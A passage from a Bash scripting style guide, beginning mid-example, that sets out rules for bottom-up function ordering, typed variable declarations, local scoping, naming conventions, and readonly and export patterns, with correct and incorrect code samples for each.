  local -- package_file="$BUILD_DIR"/app.tar.gz

  if ((DRY_RUN)); then
    info "[DRY-RUN] Would create package: $package_file"
    return 0
  fi

  tar -czf "$package_file" -C "$BUILD_DIR" .
  success "Package created: $package_file"
}

# ============================================================================
# Layer 6: Orchestration functions
# ============================================================================

run_build_phase() {
  info 'Starting build phase...'

  clean_build_dir
  compile_sources
  run_tests

  success 'Build phase complete'
}

run_package_phase() {
  info 'Starting package phase...'

  create_package

  success 'Package phase complete'
}

# ============================================================================
# Layer 7: Main function (highest level)
# ============================================================================

main() {
  # Parse arguments (simplified for example)
  while (($#)); do case $1 in
    -v|--verbose) VERBOSE+=1 ;;
    -q|--quiet)   VERBOSE=0 ;;
    -n|--dry-run) DRY_RUN=1 ;;
    -V|--version) show_version; return 0 ;;
    -h|--help)    show_help; return 0 ;;
    -[vqnVh]*) #shellcheck disable=SC2046 # Split combined short options: -Dv -> -D -v
                  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)           die 22 "Invalid option ${1@Q}" ;;
    *)            die 2 "Unexpected argument ${1@Q}" ;;
  esac; shift; done

  # Set readonly after argument parsing
  readonly -- VERBOSE DRY_RUN

  info "Starting $SCRIPT_NAME $VERSION"
  ((DRY_RUN)) && info 'DRY-RUN MODE ENABLED' ||:

  # Validate environment
  check_prerequisites
  validate_config

  # Execute phases in order
  run_build_phase
  run_package_phase

  success "$SCRIPT_NAME completed successfully"
}

main "$@"
#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - main() at the top (forward references required)
main() {
  build_project  # build_project not defined yet!
  deploy_app     # deploy_app not defined yet!
}

build_project() { ... }
deploy_app() { ... }

# ✓ Correct - main() at bottom
build_project() { ... }
deploy_app() { ... }

main() {
  build_project
  deploy_app
}

# ✗ Wrong - business logic before utilities it calls
process_file() {
  validate_input "$1"  # validate_input not defined yet!
  # ...
}

validate_input() { ... }

# ✓ Correct - utilities before business logic
validate_input() { ... }

process_file() {
  validate_input "$1"
  # ...
}

# ✗ Wrong - random/alphabetical organization ignoring dependencies
cleanup() { ... }
build() { ... }
check_deps() { ... }
main() { ... }

# ✓ Correct - dependency-ordered organization
check_deps() { ... }  # No dependencies
build() { check_deps; ... }  # Depends on check_deps
cleanup() { ... }  # No dependencies
main() { build; cleanup; }  # Depends on all

# ✗ Wrong - messaging functions scattered throughout
info() { ... }
build() { ... }
warn() { ... }
deploy() { ... }
error() { ... }

# ✓ Correct - all messaging together at top
info() { ... }
warn() { ... }
error() { ... }
die() { ... }

build() { ... }
deploy() { ... }

# ✗ Wrong - circular dependencies (A calls B, B calls A)
function_a() {
  # ...
  function_b  # Calls B
}

function_b() {
  # ...
  function_a  # Calls A - circular dependency!
}

# ✓ Correct - extract common logic to lower-level function
common_logic() {
  # Shared code
}

function_a() {
  common_logic
  # A-specific code
}

function_b() {
  common_logic
  # B-specific code
}
```

**Guidelines for within-layer ordering:**

**1. Within Layer 1 (Messaging):**
Order by severity/importance:
- `_msg()` (core utility)
- `info()`
- `success()`
- `debug()`/`vecho()`
- `warn()`
- `error()`
- `die()` (terminates script)

**2. Within Layer 3 (Helpers):**
Order alphabetically or by frequency of use:
- Most commonly used first
- Or alphabetically for easy lookup

**3. Within Layer 4 (Validation):**
Order by execution sequence:
- Functions called early in script first
- Or alphabetically

**4. Within Layer 5 (Business Logic):**
Order by logical workflow:
- Functions representing sequential steps in order
- Or group related operations together

**Edge cases and special considerations:**

**1. Circular dependencies:**

```bash
# Problem: Function A needs B, but B needs A

# Solution 1: Extract common logic to lower layer
shared_validation() {
  # Common validation used by both
}

function_a() {
  shared_validation
  # A-specific logic
}

function_b() {
  shared_validation
  # B-specific logic
}

# Solution 2: Restructure to eliminate circular dependency
# Often indicates design issue - rethink function responsibilities
```

**2. Optional functions (sourced libraries):**

```bash
# When sourcing libraries, they may define functions
# Place source statements after your messaging layer

# Messaging functions
info() { ... }
warn() { ... }
error() { ... }
die() { ... }

# Source library (may define additional utilities)
source "$SCRIPT_DIR/lib/common.sh"

# Your utilities
# (Can now use both your messaging AND library functions)
validate_email() { ... }
```

**3. Private functions:**

```bash
# Functions prefixed with _ are private/internal
# Place in same layer as public functions that use them

# Layer 1: Messaging
_msg() { ... }  # Private core utility
info() { >&2 _msg "$@"; }  # Public wrapper

# Layer 3: Utilities
_internal_parser() { ... }  # Private helper
parse_config() { _internal_parser "$@"; }  # Public interface
```

**Summary:**

- **Always organize bottom-up**: messaging → utilities → validation → business logic → orchestration → main()
- **Group functions** with section comments (e.g., `# Layer 3: Utilities`)
- **Dependencies flow downward**: higher functions call lower functions, never upward
- **Within each layer**: order alphabetically or by logical sequence
- **main() is always last** before invocation
- **Avoid circular dependencies**: extract common logic to lower layer
- **Use section comments** to visually separate layers

**Key principle:** Bottom-up organization mirrors how programmers think: understand primitives first, then compositions. This pattern eliminates forward reference issues and makes scripts immediately understandable to readers.


---


**Rule: BCS0200**

# Variable Declarations & Constants

This section establishes explicit variable declaration practices with type hints for clarity and safety. It covers type-specific declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`), variable scoping rules (global vs local), naming conventions (UPPER_CASE for constants, lower_case for variables), readonly patterns for constants (both individual declarations and the group pattern), boolean flag implementations using integers, and derived variable patterns where values are computed from other variables. These practices ensure predictable variable behavior and prevent common shell scripting errors.


---


**Rule: BCS0201**

## Type-Specific Declarations

**Always use explicit type declarations (`declare -i`, `declare --`, `declare -a`, `declare -A`) to make variable intent clear and enable type-safe operations. Explicit typing prevents bugs, improves readability, and enables bash's built-in type checking.**

**Rationale:**

- **Type Safety**: Integer declarations (`-i`) automatically enforce numeric operations and catch non-numeric assignments
- **Intent Documentation**: Explicit types serve as inline documentation showing how the variable will be used
- **Array Safety**: Array declarations prevent accidental scalar assignment that would break array operations
- **Scope Control**: `declare` and `local` provide precise variable scoping (global vs function-local)
- **Performance**: Type-specific operations are faster than string-based operations
- **Error Prevention**: Type mismatches are caught early rather than causing subtle bugs later

**All declaration types:**

**1. Integer variables (`declare -i`)**

**Purpose**: Variables that will hold only numeric values and participate in arithmetic operations.

```bash
# Declare integer variable
declare -i count=0
declare -i exit_code=1
declare -i port=8080

# Automatic arithmetic evaluation
count=count+1  # Same as: ((count+=1))
count='5 + 3'  # Evaluates to 8, not string "5 + 3"

# Type enforcement
count='abc'  # Evaluates to 0 (non-numeric becomes 0)
echo "$count"  # Output: 0
```

**When to use:**
- Counters, loop indices
- Exit codes
- Port numbers
- Numeric flags (though consider using `declare -i FLAG=0` or `declare -i FLAG=1`)
- Any variable used in arithmetic operations

**Benefits:**
- Automatic arithmetic evaluation (no need for `$(())` in some contexts)
- Type checking (non-numeric values become 0)
- Clear intent that variable holds numbers

> **See Also:** BCS0705 for using declared integers in arithmetic comparisons with `(())` instead of `[[ ... -eq ... ]]`

**2. String variables (`declare --`, `local --`)**

**Purpose**: Variables that hold text strings. The `--` separator prevents option injection.

```bash
# Declare string variables
declare -- filename=data.txt
declare -- user_input=''
declare -- config_path=/etc/app/config.conf

# ` --` prevents option injection if variable name starts with -
declare -- var_name='-weird'  # Without --, this would be interpreted as option
```

**When to use:**
- File paths
- User input
- Configuration values
- Any text data
- Default choice for most variables

**Benefits:**
- Explicit intent that variable holds text
- `--` separator prevents option injection bugs
- Clear distinction from integers and arrays

**3. Indexed arrays (`declare -a`)**

**Purpose**: Ordered lists indexed by integers (0, 1, 2, ...).

```bash
# Declare indexed array
declare -a files=()
declare -a args=(one two three)
declare -a paths

# Add elements
files+=('file1.txt')
files+=('file2.txt')

# Access elements
echo "${files[0]}"  # file1.txt
echo "${files[@]}"  # All elements
echo "${#files[@]}"  # Count: 2

# Iterate
for file in "${files[@]}"; do
  process "$file"
done
```

**When to use:**
- Lists of items (files, arguments, options)
- Command arrays for safe execution
- Any sequential collection
- Anytime you need to iterate over multiple values

**Benefits:**
- Safe word splitting (quoted expansion preserves spaces)
- Clear intent that variable is a list
- Prevents accidental scalar assignment

**4. Associative arrays (`declare -A`)**

**Purpose**: Key-value maps (hash tables, dictionaries).

```bash
# Declare associative array
declare -A config=(
  [app_name]=myapp
  [app_port]=8080
  [app_host]=localhost
)

declare -A user_data=()

# Add/modify elements
user_data[name]=Alice
user_data[email]='alice@example.com'

# Access elements
echo "${config[app_name]}"  # myapp
echo "${!config[@]}"  # All keys
echo "${config[@]}"  # All values

# Check if key exists
if [[ -v "config[app_port]" ]]; then
  echo "Port configured: ${config[app_port]}"
fi

# Iterate over keys
for key in "${!config[@]}"; do
  echo "$key = ${config[$key]}"
done
```

**When to use:**
- Configuration data (key-value pairs)
- Dynamic function dispatch
- Caching/memoization
- Any data organized by named keys rather than numeric indices

**Benefits:**
- Clear key-value relationship
- Fast lookups by key
- Replaces need for multiple scalar variables

**5. Read-only constants (`readonly --`)**

**Purpose**: Variables that should never change after initialization.

```bash
# Declare constants
readonly -- VERSION=1.0.0
readonly -i MAX_RETRIES=3
readonly -a ALLOWED_ACTIONS=(start stop restart status)

# Attempt to modify (will fail)
VERSION=2.0.0  # bash: VERSION: readonly variable

# Verify readonly status
readonly -p | grep VERSION
# Output: declare -r VERSION="1.0.0"
```

**When to use:**
- VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME
- Configuration values that shouldn't change
- Magic numbers/strings
- Validated user input (after validation, make readonly)

**Benefits:**
- Prevents accidental modification
- Self-documenting (signals immutability)
- Defensive programming

**6. Local variables in functions (`local --`)**

**Purpose**: Variables scoped to function, not visible outside.

**MANDATORY: Always use `--` separator with `local` declarations**, just like with `declare` and `readonly`. This prevents option injection if variable name or value starts with `-`.

```bash
# ✓ CORRECT - always use `--` separator
process_file() {
  local -- filename=$1
  local -i line_count
  local -a lines

  # These variables don't exist outside this function
  line_count=$(wc -l < "$filename")
  readarray -t lines < "$filename"

  echo "Processed $line_count lines"
}

# ✗ WRONG - missing `--` separator
process_file_bad() {
  local filename=$1    # If $1 is "-n", behavior changes!
  local name value     # Should be: local -- name value
}
```

**When to use:**
- ALL function parameters
- ALL temporary variables in functions
- Variables that shouldn't leak to global scope

**Benefits:**
- Prevents global namespace pollution
- Avoids variable collision between functions
- Clear scoping (function-local vs global)
- `--` separator prevents option injection bugs

**Combining type and scope:**

```bash
# Global integer
declare -i GLOBAL_COUNT=0

function count_files() {
  local -- dir=$1
  local -i file_count=0
  local -a files

  # Local integer variable
  file_count=0

  # Local array
  files=("$dir"/*)

  for file in "${files[@]}"; do
    [[ -f "$file" ]] && file_count+=1 ||:
  done

  echo "$file_count"
}

# Global array
declare -a PROCESSED_FILES=()

# Global associative array
declare -A FILE_STATUS=()

# Global readonly
readonly -- CONFIG_FILE=config.conf
```

**Complete example showing all types:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Integer variables
declare -i VERBOSE=0
declare -i ERROR_COUNT=0
declare -i MAX_RETRIES=3

# String variables
declare -- LOG_FILE=/var/log/"$SCRIPT_NAME".log
declare -- CONFIG_FILE="$SCRIPT_DIR"/config.conf

# Indexed arrays
declare -a FILES_TO_PROCESS=()
declare -a FAILED_FILES=()

# Associative arrays
declare -A CONFIG=(
  [timeout]='30'
  [retries]='3'
  [verbose]='false'
)

declare -A FILE_CHECKSUMS=()

# ============================================================================
# Color Definitions
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Utility Functions
# ============================================================================

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case "${FUNCNAME[1]}" in
    info)    prefix+=" ${CYAN}◉${NC}" ;;
    warn)    prefix+=" ${YELLOW}▲${NC}" ;;
    success) prefix+=" ${GREEN}✓${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }

# ============================================================================
# Business Logic Functions
# ============================================================================

# Function with local typed variables
process_file() {
  local -- input_file=$1
  local -i attempt=0
  local -i success=0
  local -- checksum

  while ((attempt < MAX_RETRIES && !success)); do
    attempt+=1

    info "Processing $input_file (attempt $attempt)"

    if process_command "$input_file"; then
      success=1
      checksum=$(sha256sum "$input_file" | cut -d' ' -f1)
      FILE_CHECKSUMS["$input_file"]="$checksum"
      info "Success: $input_file ($checksum)"
    else
      warn "Failed: $input_file (attempt $attempt/$MAX_RETRIES)"
      ERROR_COUNT+=1
    fi
  done

  if ((success)); then
    return 0
  else
    FAILED_FILES+=("$input_file")
    return 1
  fi
}

main() {
  # Load files into array
  FILES_TO_PROCESS=("$SCRIPT_DIR"/data/*.txt)

  # Process each file
  local -- file
  for file in "${FILES_TO_PROCESS[@]}"; do
    process_file "$file"
  done

  # Report results
  info "Processed: ${#FILES_TO_PROCESS[@]} files"
  info "Errors: $ERROR_COUNT"
  info "Failed: ${#FAILED_FILES[@]} files"

  # Show checksums
  local -- filename
  for filename in "${!FILE_CHECKSUMS[@]}"; do
    info "Checksum: $filename = ${FILE_CHECKSUMS[$filename]}"
  done

  ((ERROR_COUNT == 0))  # Exit code: 0 if no errors, 1 if errors
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - no type declaration (intent unclear)
count=0
files=()

# ✓ Correct - explicit type declarations
declare -i count=0
declare -a files=()

# ✗ Wrong - using strings for numeric operations
max_retries='3'
attempts='0'
if [[ "$attempts" -lt "$max_retries" ]]; then  # String comparison!

# ✓ Correct - use integers for numeric operations
declare -i max_retries=3
declare -i attempts=0
if ((attempts < max_retries)); then  # Numeric comparison

# ✗ Wrong - forgetting -A for associative arrays
declare CONFIG  # Creates scalar, not associative array
CONFIG[key]='value'  # Treats 'key' as 0, creates indexed array!

# ✓ Correct - explicit associative array declaration
declare -A CONFIG=()
CONFIG[key]='value'

# ✗ Wrong - global variables in functions
process_data() {
  temp_var=$1  # Global variable leak!
  result=$(process "$temp_var")
}

# ✓ Correct - local variables in functions
process_data() {
  local -- temp_var=$1
  local -- result
  result=$(process "$temp_var")
}

# ✗ Wrong - forgetting -- separator
declare filename='-weird'  # Interpreted as option!

# ✓ Correct - use -- separator
declare -- filename='-weird'

# ✗ Wrong - scalar assignment to array variable
declare -a files=()
files=file.txt  # Overwrites array with scalar!

# ✓ Correct - array assignment
declare -a files=()
files=(file.txt)  # Array with one element
# Or
files+=(file.txt)  # Append to array

# ✗ Wrong - using readonly without type
readonly VAR='value'  # Type unclear

# ✓ Correct - combine readonly with type
readonly -- VAR='value'
readonly -i COUNT=10
readonly -a ACTIONS=(start stop)
```

**Edge cases:**

**1. Integer overflow:**

```bash
declare -i big_number=9223372036854775807  # Max 64-bit signed int
big_number+=1
echo "$big_number"  # Wraps to negative!

# For very large numbers, use string or bc
declare -- big='99999999999999999999'
result=$(bc <<< "$big + 1")
```

**2. Associative array requires Bash 4.0+:**

```bash
# Check bash version
if ((BASH_VERSINFO[0] < 4)); then
  die 1 'Associative arrays require Bash 4.0+'
fi

declare -A config=()
```

**3. Array assignment syntax:**

```bash
# All of these create arrays correctly:
declare -a arr1=()           # Empty array
declare -a arr2=('a' 'b')    # Array with 2 elements
declare -a arr3              # Declare without initialization

# This creates scalar, not array:
declare -a arr4='string'     # arr4 is string 'string', not array!

# Correct array with single element:
declare -a arr5=('string')   # Array with one element
```

**4. Local arrays in functions:**

```bash
process_list() {
  # Both type and scope modifiers
  local -a files=()
  local -A status=()

  # Use arrays locally
  files=("$@")
  status[total]="${#files[@]}"
}
```

**5. Nameref variables (Bash 4.3+):**

```bash
# Pass array by reference
modify_array() {
  local -n arr_ref=$1  # Nameref to array

  arr_ref+=('new element')
}

declare -a my_array=('a' 'b')
modify_array my_array  # Pass name, not value
echo "${my_array[@]}"  # Output: a b new element
```

**Summary:**

- **Use `declare -i`** for integer variables (counters, exit codes, ports)
- **Use `declare --`** for string variables (paths, text, user input)
- **Use `declare -a`** for indexed arrays (lists, sequences)
- **Use `declare -A`** for associative arrays (key-value maps, configs)
- **Use `readonly --`** for constants that shouldn't change
- **Use `local`** for ALL variables in functions (prevent global leaks)
- **Combine modifiers** when needed: `local -i`, `local -a`, `readonly -A`
- **Always use `--`** separator to prevent option injection

**Key principle:** Explicit type declarations serve as inline documentation and enable type checking. When you declare `declare -i count=0`, you're telling both Bash and future readers: "This variable holds an integer and will be used in arithmetic operations."


---


**Rule: BCS0202**

## Variable Scoping
Always declare function-specific variables as `local` to prevent namespace pollution and unexpected side effects.

```bash
# Global variables - declare at top
declare -i VERBOSE=1 PROMPT=1

# Function variables - always use local
main() {
  local -a add_specs=()      # Local array
  local -i max_depth=3       # Local integer
  local -- path              # Local string
  local -- dir
  dir=$(dirname -- "$name")
  # ...
}
```

**Rationale:** Without `local`, function variables become global and can:
1. **Overwrite global variables** with the same name
2. **Persist after function returns**, causing unexpected behavior
3. **Interfere with recursive function calls**

**Anti-pattern example:**
```bash
# ✗ Wrong - no local declaration
process_file() {
  file=$1  # Overwrites any global $file variable!
  # ...
}

# ✓ Correct - local declaration
process_file() {
  local -- file=$1  # Scoped to this function only
  # ...
}
```

**Common gotcha - recursive functions:**
```bash
# Without local, recursive functions break
count_files() {
  total=0  # ✗ Global! Each recursive call resets it
  for file in "$1"/*; do
    total+=1
  done
  echo "$total"
}

# Correct version
count_files() {
  local -i total=0  # ✓ Each invocation gets its own total
  for file in "$1"/*; do
    total+=1
  done
  echo "$total"
}
```


---


**Rule: BCS0203**

## Naming Conventions

Follow these naming conventions to maintain consistency and avoid conflicts with shell built-ins.

| Type | Convention | Example |
|------|------------|---------|
| Constants | UPPER_CASE | `readonly MAX_RETRIES=3` |
| Global variables | UPPER_CASE or CamelCase | `VERBOSE=1` or `ConfigFile='/etc/app.conf'` |
| Local variables | lower_case with underscores | `local file_count=0` |
|  | CamelCase acceptable for important locals | `local ConfigData` |
| Internal/private functions | prefix with _ | `_validate_input()` |
| Environment variables | UPPER_CASE with underscores | `export DATABASE_URL` |

**Examples:**
```bash
# Constants
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_CONNECTIONS=100

# Global variables
declare -i VERBOSE=1
declare -- ConfigFile=/etc/myapp.conf

# Local variables
process_data() {
  local -i line_count=0
  local -- temp_file
  local -- CurrentSection  # CamelCase for important variable
}

# Private functions
_internal_helper() {
  # Used only by other functions in this script
}
```

**Rationale:**
- **UPPER_CASE for globals/constants**: Immediately visible as script-wide scope, matches shell conventions
- **lower_case for locals**: Distinguishes from globals, prevents accidental shadowing
- **Underscore prefix for private functions**: Signals "internal use only", prevents namespace conflicts
- **Avoid lowercase single-letter names**: Reserved for shell (`a`, `b`, `n`, etc.)
- **Avoid all-caps shell variables**: Don't use `PATH`, `HOME`, `USER`, etc. as your variable names


---


**Rule: BCS0204**

## Constants and Environment Variables

**Constants (readonly):**
```bash
# Use readonly for values that never change
declare -r SCRIPT_VERSION=1.0.0
declare -ir MAX_RETRIES=3
declare -r CONFIG_DIR=/etc/myapp

# Group readonly declarations
VERSION=1.0.0
AUTHOR='John Doe'
LICENSE=GPL-3
readonly -- VERSION AUTHOR LICENSE
```

**Environment variables (export):**
```bash
# Use declare -x (or export) for variables passed to child processes
declare -x ORACLE_SID=PROD
declare -x DATABASE_URL='postgresql://localhost/mydb'

# Alternative syntax
export LOG_LEVEL=DEBUG
export TEMP_DIR=/tmp/myapp
```

**Rationale:**

**When to use `readonly`:**
- **Script metadata** that never changes (VERSION, AUTHOR, LICENSE)
- **Configuration paths** determined at startup (CONFIG_DIR, DATA_DIR)
- **Constants derived from calculations** that shouldn't be modified later
- **Purpose**: Prevent accidental modification, signal intent to readers

**When to use `declare -x` / `export`:**
- **Values needed by child processes** (commands executed by script)
- **Environment configuration** for tools (DATABASE_URL, API_KEY)
- **Settings inherited by subshells** (LOG_LEVEL, DEBUG_MODE)
- **Purpose**: Make variable available in subprocess environment

**Key differences:**

| Feature | `readonly` | `declare -x` / `export` |
|---------|-----------|------------------------|
| Prevents modification | ✓ Yes | ✗ No |
| Available in subprocesses | ✗ No | ✓ Yes |
| Can be changed later | ✗ Never | ✓ Yes |
| Use case | Constants | Environment config |

**Combining both (readonly + export):**
```bash
# Make a constant that is also exported to child processes
declare -rx BUILD_ENV=production
declare -rix MAX_CONNECTIONS=100

# Or in two steps
declare -x DATABASE_URL='postgresql://prod-db/app'
readonly -- DATABASE_URL
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - exporting constants unnecessarily
export MAX_RETRIES=3  # Child processes don't need this

# ✓ Correct - only make it readonly
readonly -- MAX_RETRIES=3

# ✗ Wrong - not making true constants readonly
CONFIG_FILE=/etc/app.conf  # Could be accidentally modified later

# ✓ Correct - protect against modification
readonly -- CONFIG_FILE=/etc/app.conf

# ✗ Wrong - making user-configurable variables readonly too early
readonly -- OUTPUT_DIR="$HOME"/output  # Can't be overridden by user!

# ✓ Correct - allow override, then make readonly
OUTPUT_DIR=${OUTPUT_DIR:-"$HOME"/output}
readonly -- OUTPUT_DIR
```

**Example combining both:**
```bash
#!/usr/bin/env bash
set -euo pipefail

# Script constants (not exported)
readonly -- SCRIPT_VERSION=2.1.0
readonly -- MAX_FILE_SIZE=$((100 * 1024 * 1024))  # 100MB

# Environment variables for child processes (exported)
declare -x LOG_LEVEL=${LOG_LEVEL:-INFO}
declare -x TEMP_DIR=${TMPDIR:-/tmp}

# Combined: readonly + exported
declare -rx BUILD_ENV=production

# Derived constants (readonly)
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
readonly -- SCRIPT_PATH SCRIPT_DIR
```


---


**Rule: BCS0205**

## Readonly After Group

**When declaring multiple readonly variables, always declare them first with their values, then make them all readonly in a single statement. This pattern improves readability, prevents assignment errors, and makes the immutability contract explicit and visible.**

**Rationale:**

- **Prevents Assignment Errors**: Cannot assign value to an already-readonly variable
- **Visual Grouping**: Related constants are visually grouped together as a logical unit
- **Clear Intent**: Single readonly statement makes immutability contract obvious
- **Maintainability**: Easy to add/remove variables from the readonly group
- **Readability**: Separates initialization phase (values) from protection phase (readonly)
- **Error Detection**: If any variable hasn't been initialized before readonly, script fails explicitly

**Three-Step Progressive Readonly Workflow:**

This is the standard pattern for variables that can only be finalized after argument parsing or runtime configuration:

**Step 1 - Declare with defaults:**
```bash
declare -i VERBOSE=0 DRY_RUN=0
declare -- OUTPUT_FILE='' PREFIX=/usr/local
```

**Step 2 - Parse and modify in main():**
```bash
main() {
  while (($#)); do case $1 in
    -v) VERBOSE+=1 ;;
    -n) DRY_RUN=1 ;;
    --output) noarg "$@"; shift; OUTPUT_FILE=$1 ;;
    --prefix) noarg "$@"; shift; PREFIX=$1 ;;
  esac; shift; done

  # Step 3 - Make readonly AFTER parsing complete
  readonly -- VERBOSE DRY_RUN OUTPUT_FILE PREFIX

  # Now safe to use - all readonly
  ((VERBOSE)) && info "Using prefix: $PREFIX" ||:
}
```

**Rationale for three-step pattern:**
- Variables must be **mutable during parsing** (Step 2)
- Making readonly **too early** prevents modification
- Making readonly **after parsing** locks in final values (Step 3)
- Prevents accidental modification throughout rest of script

**Exception - Script Metadata:**

**Note:** As of BCS v1.0.1, the **preferred pattern** for script metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) is `declare -r` for immediate readonly declaration. While readonly-after-group remains valid for metadata, `declare -r` is now recommended (see BCS0103). All other variable groups (colors, paths, configuration) continue to use the readonly-after-group pattern described below.

The important principle is that script metadata variables must be readonly. The specific mechanism (readonly-after-group vs declare -r) is less critical than ensuring immutability is achieved.

**Standard pattern (for non-metadata variables):**

```bash
# Script metadata (exception - uses declare -r, see BCS0103)
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Message function flags
declare -i VERBOSE=1 PROMPT=1 DEBUG=0
# Standard color definitions (if terminal output)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

**Why readonly-after-group pattern works:**

```bash
# For non-metadata variable groups (paths, colors, config):

# Phase 1: Initialize all variables
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
LIB_DIR="$PREFIX"/lib

# Phase 2: Protect entire group
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR

# Now all four variables are immutable
```

**What groups belong together:**

**1. Script metadata group (exception - uses declare -r, see BCS0103):**
```bash
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

**2. Color definitions group:**
```bash
# Terminal colors (conditional)
if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' BOLD=$'\033[1m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' BOLD='' NC=''
fi
```

**3. Path constants group:**
```bash
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share/myapp
LIB_DIR="$PREFIX"/lib/myapp
ETC_DIR="$PREFIX"/etc/myapp
readonly -- PREFIX BIN_DIR SHARE_DIR LIB_DIR ETC_DIR
```

**4. Configuration defaults group:**
```bash
DEFAULT_TIMEOUT=30
DEFAULT_RETRIES=3
DEFAULT_LOG_LEVEL=info
DEFAULT_PORT=8080
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES DEFAULT_LOG_LEVEL DEFAULT_PORT
```

**Complete example:**

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# ============================================================================
# Script Metadata (Group 1 - exception: uses declare -r, see BCS0103)
# ============================================================================

declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# ============================================================================
# Color Definitions (Group 2)
# ============================================================================

if [[ -t 1 && -t 2 ]]; then
  declare -r RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  declare -r RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

# ============================================================================
# Installation Paths (Group 3)
# ============================================================================

PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share/"$SCRIPT_NAME"
readonly -- PREFIX BIN_DIR SHARE_DIR

# ============================================================================
# Configuration (Group 4)
# ============================================================================

DEFAULT_TIMEOUT=30
DEFAULT_RETRIES=3
MAX_FILE_SIZE=104857600  # 100MB
readonly -- DEFAULT_TIMEOUT DEFAULT_RETRIES MAX_FILE_SIZE

# ============================================================================
# Mutable Global Variables
# ============================================================================

declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -i ERROR_COUNT=0

# These will be made readonly after argument parsing
declare -- LOG_FILE=''
declare -- CONFIG_FILE=''

# Main logic
main() {
  # Parse arguments...
  # After parsing, make parsed values readonly
  [[ -z "$LOG_FILE" ]] || readonly -- LOG_FILE
  [[ -z "$CONFIG_FILE" ]] || readonly -- CONFIG_FILE

  info "Starting $SCRIPT_NAME $VERSION"
}

main "$@"

#fin
```

**Anti-patterns to avoid:**

```bash
# For script metadata (see BCS0103):
# ▲ Valid but not preferred - readonly-after-group for metadata
VERSION=1.0.0
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

# ✓ Preferred - declare -r for script metadata (BCS0103)
declare -r VERSION=1.0.0
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Note: Both patterns above are valid. The declare -r pattern is preferred
# as of BCS v1.0.1 for its conciseness and immediate immutability.

# For non-metadata variable groups:
# ✗ Wrong - making readonly before all values are set
PREFIX=/usr/local
readonly -- PREFIX  # Premature!
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share

# If BIN_DIR assignment fails, PREFIX is readonly but
# SHARE_DIR is not, creating inconsistent protection

# ✓ Correct - all values set, then all readonly
PREFIX=${PREFIX:-/usr/local}
BIN_DIR="$PREFIX"/bin
SHARE_DIR="$PREFIX"/share
readonly -- PREFIX BIN_DIR SHARE_DIR

# ✗ Wrong - forgetting -- separator
readonly PREFIX BIN_DIR  # Risky if variable name starts with -

# ✓ Correct - always use -- separator
readonly -- PREFIX BIN_DIR

# ✗ Wrong - mixing related and unrelated variables
CONFIG_FILE=config.conf
VERBOSE=1
PREFIX=/usr/local
